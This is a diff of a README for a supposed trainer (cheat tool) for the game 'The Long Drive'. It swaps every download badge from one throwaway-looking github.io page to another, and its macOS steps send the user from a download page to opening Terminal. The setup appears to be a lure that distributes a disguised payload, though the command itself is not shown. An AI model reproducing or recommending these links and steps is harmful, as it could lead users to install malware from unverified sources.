@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -78,9 +78,9 @@ The Long Drive is a surreal, procedurally generated road trip survival game set 
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 </div>
 
@@ -101,7 +101,7 @@ The Long Drive is a surreal, procedurally generated road trip survival game set 
 
 <div align="center">
 
-[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -133,7 +133,7 @@ The Long Drive is a surreal, procedurally generated road trip survival game set 
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ The Long Drive is a surreal, procedurally generated road trip survival game set 
 
 <div align="center">
 
-[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download The Long Drive Trainer](https://img.shields.io/badge/⬇_Download_The%20Long%20Drive_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
